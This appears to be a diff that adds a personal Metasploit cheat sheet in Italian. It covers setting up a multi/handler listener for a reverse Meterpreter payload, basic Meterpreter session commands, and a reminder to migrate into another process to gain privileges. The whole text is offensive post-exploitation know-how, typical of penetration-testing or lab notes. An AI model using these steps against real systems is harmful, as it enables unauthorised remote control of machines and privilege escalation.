@@ -1,0 +1,19 @@
+MULTI HANDLER:
+    use multi/handler
+    set payload <payload>           // es. php/meterpreter/reverse_tcp
+    set lhost <ip>
+    set lport <port>
+    set AutoRunScript post/windows/manage/migrate
+
+
+
+METERPRETER COMMANDS:
+    sysinfo
+    shell       //get shell
+    background
+    sessions -i 1
+    ps
+
+IMPORTANTE RICORDA DI FARE BIND DELLA SHELL METERPRETER SU QUALCHE PROCESSO MIGLIORE, POTREBBE DARE PIÙ PRIVILEGI E FAR FUNZIONARE MEGLIO GLI ALTRI EXPLOIT
+  ps      //individua pid del processo es. 1936
+  migrate 1936
